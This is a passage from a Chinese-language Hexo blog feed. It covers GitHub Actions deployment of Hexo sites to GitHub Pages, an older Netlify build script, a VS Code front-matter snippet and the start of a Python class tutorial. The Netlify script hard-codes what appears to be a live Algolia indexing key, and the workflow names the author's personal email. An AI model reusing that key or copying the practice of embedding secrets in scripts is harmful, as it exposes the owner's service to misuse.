class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">    <span class="attr">push:</span></span><br><span class="line">        <span class="attr">branches:</span> <span class="string">master</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">    <span class="attr">hexo_depoly:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">env:</span></span><br><span class="line">        <span class="attr">TZ:</span> <span class="string">Asia/Shanghai</span></span><br><span class="line">        <span class="attr">GIT_NAME:</span> <span class="string">realyee</span></span><br><span class="line">        <span class="attr">GIT_EMAIL:</span> <span class="number">615836359</span><span class="string">@qq.com</span></span><br><span class="line">        <span class="attr">BLOG_REPO:</span> <span class="string">blog</span></span><br><span class="line">        <span class="attr">GH_TOKEN:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.GH_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line">        <span class="attr">THEME_NAME:</span> <span class="string">maupassant</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">        <span class="comment"># checkout the source code and update the submodule recuresively,like `git submodule update --init --recursive`</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Checkout</span> <span class="string">source</span></span><br><span class="line">          <span class="attr">uses:</span> <span class="string">actions/checkout@v3</span></span><br><span class="line">          <span class="attr">with:</span></span><br><span class="line">              <span class="attr">submodules:</span> <span class="string">recursive</span></span><br><span class="line"></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Configure</span> <span class="string">theme</span></span><br><span class="line">          <span class="comment"># copy the theme config and avatar to the theme folder</span></span><br><span class="line">          <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">              cp ./themes/_config.yml ./themes/$&#123;THEME_NAME&#125;/_config.yml</span></span><br><span class="line"><span class="string">              cp ./themes/source/img/avatar.png ./themes/$&#123;THEME_NAME&#125;/source/img/avatar.png</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Setup</span> <span class="string">Node.js</span></span><br><span class="line">          <span class="attr">uses:</span> <span class="string">actions/setup-node@v3</span></span><br><span class="line">          <span class="attr">with:</span></span><br><span class="line">              <span class="attr">node-version:</span> <span class="string">&quot;18.x&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Install pandoc for mathjax</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Install</span> <span class="string">pandoc</span></span><br><span class="line">          <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">              cd /tmp</span></span><br><span class="line"><span class="string">              wget -c https://github.com/jgm/pandoc/releases/download/3.1.6/pandoc-3.1.6-1-amd64.deb</span></span><br><span class="line"><span class="string">              sudo dpkg -i pandoc-3.1.6-1-amd64.deb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Install</span> <span class="string">dependencies</span> <span class="string">&amp;</span> <span class="string">Generate</span> <span class="string">static</span> <span class="string">files</span></span><br><span class="line">          <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">              node -v</span></span><br><span class="line"><span class="string">              npm i -g hexo-cli</span></span><br><span class="line"><span class="string">              npm uninstall hexo-renderer-marked --save</span></span><br><span class="line"><span class="string">              npm install hexo-renderer-pandoc --save</span></span><br><span class="line"><span class="string">              npm i</span></span><br><span class="line"><span class="string">              hexo clean</span></span><br><span class="line"><span class="string">              hexo g</span></span><br><span class="line"><span class="string"></span>        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Git</span> <span class="string">config</span></span><br><span class="line">          <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">              git config --global user.name $&#123;GIT_NAME&#125;</span></span><br><span class="line"><span class="string">              git config --global user.email $&#123;GIT_EMAIL&#125;</span></span><br><span class="line"><span class="string"></span>        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Deploy</span> <span class="string">to</span> <span class="string">Github</span> <span class="string">Pages</span></span><br><span class="line">          <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">              git clone https://github.com/$&#123;GIT_NAME&#125;/$&#123;BLOG_REPO&#125;.git</span></span><br><span class="line"><span class="string">              cp -r ./public/* ./$&#123;BLOG_REPO&#125;/</span></span><br><span class="line"><span class="string">              cd $&#123;BLOG_REPO&#125;</span></span><br><span class="line"><span class="string">              git add .</span></span><br><span class="line"><span class="string">              git commit -m &quot;$&#123;&#123;github.event.head_commit.message&#125;&#125;&quot;</span></span><br><span class="line"><span class="string">              git push &quot;https://$&#123;GH_TOKEN&#125;@github.com/$&#123;GIT_NAME&#125;/$&#123;BLOG_REPO&#125;.git&quot; master</span></span><br></pre></td></tr></table></figure></p><p>修改点如下：</p><ol type="1"><li><p><code>push</code> 的 <code>master</code> 是指在 push 到你这个仓库academic_source 的 master 分支时，才会触发这个 github action</p></li><li><p>对应修改 github的用户名，邮箱，主题名以及你要发布到的仓库名，方便后面的变量引用</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GIT_NAME: realyee</span><br><span class="line">GIT_EMAIL: xxxxxxx@qq.com</span><br><span class="line">ACADEMIC_REPO: realyee.github.io</span><br><span class="line">GH_TOKEN: $&#123;&#123; secrets.GH_TOKEN &#125;&#125;</span><br><span class="line">THEME_NAME: Academia</span><br></pre></td></tr></table></figure></p><p>注意: 在 github action 中的 env变量中不能嵌套使用变量，只能使用字面值, 像这种<code>REPO_NAME: $&#123;GIT_NAME&#125;.github.io</code> 就会报错。 GH_TOKEN这里需要你在 <a href="https://github.com/settings/tokens">githubtoken</a> 这里生成一个名为 GH_TOKEN 的永不过期的 classictoken，然后给予其 repo 和 workflow 的操作权限（注意生成的时候保存 token值）。然后在 academic_source 仓库的 setting 的secret（https://github.com/realyee/academic_source/settings/secrets/actions）（注意换为你的用户名）添加你刚刚保存的token 值，并命名为 GH_TOKEN。</p></li><li><p><code>cp ./themes/_config.yml ./themes/$&#123;THEME_NAME&#125;/_config.yml</code>：每次update theme submodule，那配置文件就得额外自己存，然后拷贝进入。在本地的 academic_source 的 themes 目录下保存并配置一份 theme 的<code>_config.yml</code>, github action 到时就会自己复制过去。</p></li></ol></li><li><p>在 hexo 博客根目录下，初始化 git 仓库，并将 fork 的仓库加入submodule, 连接仓库，并将源文件 push 到 master 分支</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br><span class="line">git submodule add https://github.com/realyee/hexo-theme-academia themes/academia</span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;first commit&quot;</span><br><span class="line">git remote add origin git@github.com:realyee/academic_source.git</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure></p></li></ol><p>blog_source 的 github action 配置类似，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">name: Deployment</span><br><span class="line"></span><br><span class="line">on:</span><br><span class="line">    push:</span><br><span class="line">        branches: master</span><br><span class="line"></span><br><span class="line">jobs:</span><br><span class="line">    hexo_depoly:</span><br><span class="line">        runs-on: ubuntu-latest</span><br><span class="line">        env:</span><br><span class="line">            TZ: Asia/Shanghai</span><br><span class="line">            GIT_NAME: realyee</span><br><span class="line">            GIT_EMAIL: 615836359@qq.com</span><br><span class="line">            BLOG_REPO: blog</span><br><span class="line">            GH_TOKEN: $&#123;&#123; secrets.GH_TOKEN &#125;&#125;</span><br><span class="line">            THEME_NAME: maupassant</span><br><span class="line"></span><br><span class="line">        steps:</span><br><span class="line">            # checkout the source code and update the submodule recuresively,like `git submodule update --init --recursive`</span><br><span class="line">            - name: Checkout source</span><br><span class="line">              uses: actions/checkout@v3</span><br><span class="line">              with:</span><br><span class="line">                  submodules: recursive</span><br><span class="line"></span><br><span class="line">            - name: Configure theme</span><br><span class="line">              # copy the theme config and avatar to the theme folder</span><br><span class="line">              run: |</span><br><span class="line">                  cp ./themes/_config.yml ./themes/$&#123;THEME_NAME&#125;/_config.yml</span><br><span class="line">                  cp ./themes/source/img/avatar.png ./themes/$&#123;THEME_NAME&#125;/source/img/avatar.png</span><br><span class="line"></span><br><span class="line">            - name: Setup Node.js</span><br><span class="line">              uses: actions/setup-node@v3</span><br><span class="line">              with:</span><br><span class="line">                  node-version: &quot;18.x&quot;</span><br><span class="line"></span><br><span class="line">            - name: Install dependencies &amp; Generate static files</span><br><span class="line">              run: |</span><br><span class="line">                  node -v</span><br><span class="line">                  npm i -g hexo-cli</span><br><span class="line">                  npm i</span><br><span class="line">                  hexo clean</span><br><span class="line">                  hexo g</span><br><span class="line">            - name: Git config</span><br><span class="line">              run: |</span><br><span class="line">                  git config --global user.name $&#123;GIT_NAME&#125;</span><br><span class="line">                  git config --global user.email $&#123;GIT_EMAIL&#125;</span><br><span class="line">            - name: Deploy to Github Pages</span><br><span class="line">              run: |</span><br><span class="line">                  git clone https://github.com/$&#123;GIT_NAME&#125;/$&#123;BLOG_REPO&#125;.git</span><br><span class="line">                  cp -r ./public/* ./$&#123;BLOG_REPO&#125;/</span><br><span class="line">                  cd $&#123;BLOG_REPO&#125;</span><br><span class="line">                  git add .</span><br><span class="line">                  git commit -m &quot;Github Action Automated Deployment $(date +&#x27;%Y-%m-%d %H:%M:%S&#x27;)&quot;</span><br><span class="line">                  git push &quot;https://$&#123;GH_TOKEN&#125;@github.com/$&#123;GIT_NAME&#125;/$&#123;BLOG_REPO&#125;.git&quot; master</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="5" type="1"><li>push 的 commit message 可以改为该变量<code>$&#123;&#123; github.event.head_commit.message &#125;&#125;</code>，该变量获取仓库的最新 commitmessage.</li></ol><h2 id="关于-maupassant-hexo-的小修改">关于 maupassant-hexo的小修改</h2><ol type="1"><li><p>blog 的头像与超链接</p><blockquote><p>网站存放在子目录,如果您的网站存放在子目录中，例如http://example.com/blog，则请将您的 url 设为 http://example.com/blog并把 root 设为 /blog/。</p></blockquote><p>由于 maupassant 在这里没有用相对路径，因此<code>_config.yml</code>中avatar 的路径需要多写一层<code>avatar: ./blog/img/avatar.png</code></p></li><li><p>换掉头像的超链接： 在<code>blog/themes/maupassant/layout/_widget/info.pug</code> 的<code>a.info-avatar(href='/', title= __(''))</code></p></li><li><p>tagcloud 的超链接相对路径也存在问题:在<code>blog/themes/maupassant/layout/tagcloud.pug</code> 改为绝对路径<code>a(href=config.root + 'tags/#' + tag.name, title=tag.name, rel= tag.length)</code></p></li></ol><p>以上问题我在自己 fork 的 maupassant-hexo 仓库下也对应修改了</p><h2 id="其他部署中遇到的小问题">其他部署中遇到的小问题</h2><ol type="1"><li><p>Github action 的 <code>uses</code> 和 <code>run</code>不能一起使用</p></li><li><p>git clone 注意指定 git http 协议，不会像浏览器似的输入<code>github.com</code> 就给你补全 https</p></li><li><p>ssh 在使用代理的情况下 22 端口不好用，报错如下</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kex_exchange_identification: Connection closed by remote host</span><br><span class="line">Connection closed by 20.205.243.166 port 22</span><br><span class="line">fatal: Could not read from remote repository.</span><br><span class="line"></span><br><span class="line">Please make sure you have the correct access rights</span><br><span class="line">and the repository exists.</span><br></pre></td></tr></table></figure></p><p>解决办法: 在 <code>~/.ssh/config</code> 中改成 443 端口</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HostName ssh.github.com</span><br><span class="line">Port 443</span><br></pre></td></tr></table></figure></p></li><li><p>如果希望在 hexo 中 share pdf 等文件，可以在 source 下创建一个assets 文件夹，放到里面，然后用带有博客网址的绝对路径引用文件</p></li></ol><hr /><h2 id="old-discard-save-for-memory-hexo-next-使用-netlify">[Old,discard, SAVE FOR MEMORY] hexo-next 使用 netlify</h2><p>本静态博客采用 hexo 模板 next 主题，markdown 源码及生成的 html分别放在 Github 两个仓库。</p><p>通过 netlify 根据我写的简单脚本自动化部署操作 markdown源码仓库，进行构建，并发布到 html 博客仓库。因此，我只需要对源码仓库的markdown 进行编写，然后使用 git 同步仓库即可。</p><p>以下我的自动化构建脚本（仅供参考）:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/usr/bin/env sh</span></span><br><span class="line">npm i</span><br><span class="line">npm i -g hexo-cli</span><br><span class="line">git clone --depth 1 --recursive https://github.com/violetu/hexo-theme-next themes/next</span><br><span class="line">cp -r source/themes/next/* themes/next/</span><br><span class="line">hexo clean</span><br><span class="line">hexo g &gt;/dev/null</span><br><span class="line">hexo d</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">向 algolia 提交数据，以便搜索</span></span><br><span class="line">export HEXO_ALGOLIA_INDEXING_KEY=&quot;a592b317037e2af5638bb820baa201e8&quot;</span><br><span class="line">hexo algolia</span><br></pre></td></tr></table></figure><h3 id="配置">配置</h3><p><a href="https://tding.top/archives/42c38b10">Hexo-NexT (v7.0+)主题配置</a> <a href="https://ftzzloo.com/hexo-add-disqus/">Hexo添加评论系统 Disqus</a></p><h3 id="新域名导致不蒜子统计数据归零">新域名导致不蒜子统计数据归零</h3><p><ahref="https://tqraf.cn/2020/07/busuanzi.html">不蒜子统计数据修改</a></p><h3 id="algolia-搜索不到东西">algolia 搜索不到东西</h3><p>原因：部署脚本中忘记向 hexo 提交数据了。</p><p>解决方案: 那是因为你未能成功 hexo algolia每次网站更新很多文章后,要及时提交数据, 即执行:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export HEXO_ALGOLIA_INDEXING_KEY=你为索引单独创建的key（不是search-only key）</span><br><span class="line">hexo algolia</span><br></pre></td></tr></table></figure><h2 id="参考资料">参考资料</h2><ol type="1"><li><a href="https://ji2xpro.github.io/ea684c22/">Hexo博客指南|第十三篇:Icarus 配置 - 网站搜索插件</a></li><li><ahref="https://codingpub.github.io/2016/04/10/%E5%AE%9A%E5%88%B6Hexo-maupassant/">定制Hexo - maupassant | Coding Pub</a></li><li><a href="https://hexo.io/zh-cn/docs/configuration.html">配置 |Hexo</a></li><li><a href="https://juejin.cn/post/7215478156948701240">利用 Github实现(多个)个人网站 - 掘金</a> <ahref="https://www.bugjs.cn/index.php/archives/6/">Github Actions自动部署 Hexo 博客至个人服务器 - zain 的前端小窝</a></li><li><ahref="https://github.com/marketplace/actions/checkout-submodules">Checkoutsubmodules · Actions · GitHub Marketplace</a></li><li><ahref="https://jckling.github.io/2023/02/18/Other/Github%20Action%20%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2%20Hexo%20%E5%8D%9A%E5%AE%A2/">GithubAction 自动部署 Hexo 博客 | Jckling's Blog</a></li><li><ahref="https://eftakhairul.com/githubs-repository-not-found-error-and-how-to-fix-it/">Github’s“repository not found” error and How to fix it</a></li><li><ahref="https://huanglizhu.github.io/2020/02/21/%E8%AE%A9google%E6%94%B6%E5%BD%95github%20pages%EF%BC%88hexo%EF%BC%89/">让google 收录 github pages（hexo） | 珠</a></li><li><ahref="https://shiraha.cn/2021/use-pandoc-to-render-multiline-formulas-correctly/">使用pandoc 正确渲染多行 MathJax 公式 - 七海の参考書</a></li><li><a href="https://zhuanlan.zhihu.com/p/58392526">GitLab 中将 Hexo更改数学公式渲染引擎为 Pandoc - 知乎</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>vscode 添加 hexo yaml snippet</title>
      <link href="/blog/2020/03/15/misc/hexo_vscode/"/>
      <url>/blog/2020/03/15/misc/hexo_vscode/</url>
      
        <content type="html"><![CDATA[<h2 id="vscode-添加-hexo-yaml-snippet">vscode 添加 hexo yamlsnippet</h2><ol type="1"><li><p>创建针对于 markdown 文件格式的 snippet</p><p><code>Ctrl+shift+p</code> 打开 vscode command palette，然后输入snippet, 选择 <code>Preference: Configure User Snippets</code>并回车，然后再输入 markdown 并回车，即可创建一个专门存放 markdown 格式文件snippet 的 json。</p></li><li><p>将我提供的 snippet 复制到大括号中，然后保存</p><pre><code><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">    <span class="attr">&quot;hexo yaml&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;prefix&quot;</span><span class="punctuation">:</span> <span class="string">&quot;yaml&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;body&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="string">&quot;---\ntitle: $1&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;toc: true&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;tags:&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;   - $2&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;description: $3&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;categories:&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;   - $4&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;date: $CURRENT_YEAR-$CURRENT_MONTH-$CURRENT_DATE $CURRENT_HOUR:$CURRENT_MINUTE:$CURRENT_SECOND&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;---\n&quot;</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;snippet fot hexo yaml&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></code></pre><p>```</p></li><li><p>测试</p><p>在 markdown 的 <code>.md</code> 后缀文件中输入 <code>hexoy</code>，并按回车或者 Tab 键，即可自动替换为 snippet。</p></li></ol><h2 id="参考">参考</h2><ol type="1"><li><ahref="https://code.visualstudio.com/docs/editor/userdefinedsnippets">Snippetsin Visual Studio Code</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python class</title>
      <link href="/blog/2020/03/10/programming/python/2.object-oriented/properties_methods/"/>
      <url>/blog/2020/03/10/programming/python/2.object-oriented/properties_methods/</url>
      
        <content type="html"><![CDATA[<h2 id="类的结构">类的结构</h2><h3 id="术语-实例">术语 —— 实例</h3><ol type="1"><li>使用面向对象开发，<strong>第 1 步</strong> 是设计<strong>类</strong></li><li>使用<code>类名()</code> 创建对象，创建对象的动作有两步:<ol type="1"><li>在内存中为对象 <strong>分配空间</strong></li><li>调用初始化方法 <code>__init__</code> 为<strong>对象初始化</strong></li></ol></li><li>对象创建后，<strong>内存</strong> 中就有了一个对象的<strong>实实在在</strong> 的存在 —— <strong>实例</strong></li></ol><p>因此，通常也会把：</p><ol type="1"><li>创建出来的 <strong>对象</strong> 叫做 <strong>类</strong> 的<strong>实例</strong></li><li>创建对象的 <strong>动作</strong> 叫做 <strong>实例化</strong></li><li><strong>对象的属性</strong> 叫做 <strong>实例属性</strong></li><li><strong>对象调用的方法</strong> 叫做 <strong>实例方法</strong></li></ol><p>在程序执行时：</p><ol type="1"><li>对象各自拥有自己的 <strong>实例属性</strong></li><li>调用对象方法，可以通过 <code>self</code><ul><li>访问自己的属性</li><li>调用自己的方法</li></ul></li></ol><p><strong>结论</strong></p><ul><li><strong>每一个对象</strong> 都有自己<strong>独立的内存空间</strong>，<strong>保存各自不同的属性</strong></li><li><strong>多个对象的方法</strong>，<strong>在内存中只有一份</strong>，在调用方法时，<strong>需要把对象的引用</strong>传递到方法内部</li></ul><h3 id="类是一个特殊的对象">类是一个特殊的对象</h3><blockquote><p><code>Python</code> 中 <strong>一切皆对象</strong>：</p><ul><li><code>class AAA:</code> 定义的类属于 <strong>类对象</strong></li><li><code>obj1 = AAA()</code> 属于 <strong>实例对象</strong></li></ul></blockquote><ul><li>在程序运行时，<strong>类</strong> 同样<strong>会被加载到内存</strong></li><li>在 <code>Python</code> 中，<strong>类</strong> 是一个特殊的对象 ——<strong>类对象</strong></li><li>在程序运行时，<strong>类对象</strong> 在内存中<strong>只有一份</strong>，使用 <strong>一个类</strong> 可以创建出<strong>很多个对象实例</strong></li><li>除了封装<strong>实例</strong>的<strong>属性</strong>和<strong>方法</strong>外，<strong>类对象</strong>还可以拥有自己的<strong>属性</strong>和<strong>方法</strong><ol type="1"><li><strong>类属性</strong></li><li><strong>类方法</strong></li></ol></li><li>无论是在对象的方法里面， 还是在类外面都通过 <strong>类名.</strong>的方式可以 <strong>访问类的属性</strong> 或者<strong>调用类的方法</strong></li></ul><h2 id="类属性和实例属性">类属性和实例属性</h2><h3 id="概念和使用">概念和使用</h3><ul><li><strong>类属性</strong> 就是给 <strong>类对象</strong> 中定义的<strong>属性</strong></li><li>通常用来记录 <strong>与这个类相关</strong> 的特征</li><li><strong>类属性</strong> <strong>不会用于</strong>记录<strong>具体对象的特征</strong></li></ul><p><strong>示例需求</strong></p><ul><li>定义一个 <strong>工具类</strong></li><li>每件工具都有自己的 <code>name</code></li><li><strong>需求</strong> —— 知道使用这个类，创建了多少个工具对象</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Tool</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="comment"># 使用赋值语句定义类属性, 记录创建工具对象的总数</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 针对了类属性做一个计数 + 1</span></span><br><span class="line">        Tool.count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">tool1 = Tool(<span class="string">&#x27;斧头&#x27;</span>)</span><br><span class="line">tool1 = Tool(<span class="string">&#x27;榔头&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 知道使用 Tool 类创建了多少对象</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;现在创建了 <span class="subst">&#123;Tool.count&#125;</span> 个工具&#x27;</span>)</span><br></pre></td></tr></table></figure><p>note：Python 中的类属性类似于 C++中的静态属性，属于类，不属于对象，且只有一份</p><h3 id="属性的获取机制科普">2.2 属性的获取机制（科普）</h3><ul><li>在 <code>Python</code> 中 <strong>属性的获取</strong> 存在一个<strong>向上查找机制</strong></li><li>因此，要访问类属性有两种方式：<ol type="1"><li><strong>类名.类属性</strong></li><li><strong>对象.类属性</strong> （不推荐）</li></ol></li></ul><p><strong>注意</strong></p><ul><li>如果使用 <code>对象.类属性 = 值</code> 赋值语句，只会<strong>给对象添加一个属性</strong>，而不会影响到<strong>类属性的值</strong></li></ul><h2 id="类方法和静态方法">类方法和静态方法</h2><h3 id="类方法">3.1 类方法</h3><ul><li>类属性 就是针对 <strong>类对象</strong> 定义的属性<ul><li>使用 <strong>赋值语句</strong> 在 <code>class</code>关键字下方可以定义 <strong>类属性</strong></li><li><strong>类属性</strong> 用于记录 <strong>与这个类相关</strong>的特征</li></ul></li><li>类方法 就是针对 <strong>类对象</strong> 定义的方法<ul><li>在 <strong>类方法</strong> 内部可以直接访问 <strong>类属性</strong>或者调用其他的 <strong>类方法</strong></li></ul></li></ul><p><strong>语法如下</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@classmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">类方法名</span>(<span class="params">cls</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><ul><li>类方法需要用 <strong>修饰器</strong> <code>@classmethod</code>来标识，<strong>告诉解释器这是一个类方法</strong></li><li>类方法的第一个参数应该是 <code>cls</code><ul><li>由 <strong>哪一个类</strong> 调用的方法，方法内的 <code>cls</code>就是 <strong>哪一个类的引用</strong></li><li>这个参数和 <strong>实例方法</strong> 的第一个参数: <code>self</code>类似</li><li><strong>提示</strong> 使用其他名称也可以，不过习惯使用<code>cls</code></li></ul></li><li>通过 <strong>类名.</strong> 调用<strong>类方法</strong>，<strong>调用方法时</strong>，不需要传递<code>cls</code> 参数</li><li>在方法内部<ul><li>可以通过 <code>cls.</code> <strong>访问类的属性</strong></li><li>也可以通过 <code>cls.</code> <strong>调用其他的类方法</strong></li></ul></li></ul><p><strong>示例需求</strong></p><ul><li>定义一个 <strong>工具类</strong></li><li>每件工具都有自己的 <code>name</code></li><li><strong>需求</strong> —— 在 <strong>类</strong> 封装一个<code>show_tool_count</code>的类方法，输出使用当前这个类，创建的对象个数</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Tool</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用赋值语句定义类属性, 记录创建工具对象的总数</span></span><br><span class="line">    count = <span 